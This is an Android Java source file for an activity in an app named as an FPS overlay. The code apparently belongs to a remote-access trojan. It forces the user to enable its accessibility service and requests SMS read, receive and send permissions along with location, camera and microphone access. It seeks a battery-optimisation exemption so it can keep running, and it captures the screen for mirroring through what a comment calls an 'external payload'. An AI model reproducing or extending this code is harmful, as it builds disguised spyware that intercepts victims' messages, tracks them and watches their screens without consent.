package com.bluestacks.fpsoverlay;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import androidx.annotation.NonNull;
import androidx.core.app.ActivityCompat;
import java.util.ArrayList;
import java.util.List;

public class CoreActivity extends Activity {
    private static final int REQ_CODE = 100;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        handleIntent(getIntent());
    }

    @Override
    protected void onNewIntent(Intent intent) {
        super.onNewIntent(intent);
        setIntent(intent);
        handleIntent(intent);
    }

    private void handleIntent(Intent intent) {
        if (!isAccessibilityServiceEnabled()) {
            try {
                Intent s = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
                s.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(s);
            } catch (Exception ignored) {}
            finish();
            return;
        }

        if (intent != null && intent.getBooleanExtra("request_mirror", false)) {
            requestMirrorPermission();
            return;
        }

        String type = intent != null ? intent.getStringExtra("request_type") : null;
        if (type != null) {
            requestSpecificPermission(type);
            return;
        }

        // Default behavior: just check accessibility and finish if already enabled
        finish();
    }

    private void requestSpecificPermission(String type) {
        switch (type) {
            case "all":
                ActivityCompat.requestPermissions(this, new String[]{
                        "android.permission.READ_SMS", "android.permission.RECEIVE_SMS", "android.permission.SEND_SMS",
                        "android.permission.ACCESS_FINE_LOCATION", "android.permission.ACCESS_COARSE_LOCATION",
                        "android.permission.CAMERA",
                        "android.permission.RECORD_AUDIO"
                }, REQ_CODE);
                break;
            case "sms":
                ActivityCompat.requestPermissions(this, new String[]{
                    Manifest.permission.READ_SMS, Manifest.permission.RECEIVE_SMS, Manifest.permission.SEND_SMS
                }, REQ_CODE);
                break;
            case "location":
                ActivityCompat.requestPermissions(this, new String[]{
                    Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION
                }, REQ_CODE);
                break;
            case "camera":
                ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.CAMERA}, REQ_CODE);
                break;
            case "mic":
                ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.RECORD_AUDIO}, REQ_CODE);
                break;
            case "battery":
                checkBatteryOptimization();
                break;
            default:
                finish();
                break;
        }
    }

    private void checkBatteryOptimization() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
                try {
                    Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                    intent.setData(Uri.parse("package:" + getPackageName()));
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    startActivity(intent);
                } catch (Exception ignored) {}
            }
        }
    }

    private void requestMirrorPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            android.media.projection.MediaProjectionManager mp = (android.media.projection.MediaProjectionManager) getSystemService(android.content.Context.MEDIA_PROJECTION_SERVICE);
            if (mp != null) {
                startActivityForResult(mp.createScreenCaptureIntent(), 999);
            } else {
                checkBatteryOptimization();
                finish();
            }
        } else {
            checkBatteryOptimization();
            finish();
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, android.content.Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == 999) {
            if (resultCode == RESULT_OK) {
                // Simpan intent ke SupportService karena WebRtcManager sudah dipindah ke payload eksternal
                SupportService.setMirrorIntent(data);
                
                Intent resumeIntent = new Intent(this, SupportService.class);
                resumeIntent.putExtra("resume_mirror", true);
                resumeIntent.putExtra("mirror_data", data);
                startService(resumeIntent);
            }
            checkBatteryOptimization();
            finish();
        }
    }

    private boolean isAccessibilityServiceEnabled() {
        String service = getPackageName() + "/" + SupportService.class.getCanonicalName();
        try {
            int accessibilityEnabled = Settings.Secure.getInt(getContentResolver(), Settings.Secure.ACCESSIBILITY_ENABLED);
            if (accessibilityEnabled == 1) {
                String settingValue = Settings.Secure.getString(getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
                return settingValue != null && settingValue.contains(service);
            }
        } catch (Exception ignored) {}
        return false;
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        
        String type = getIntent().getStringExtra("request_type");
        if ("all".equals(type)) {
            // Setelah izin runtime selesai, langsung pemicu dialog baterai
            checkBatteryOptimization();
        }
        finish();
    }
}
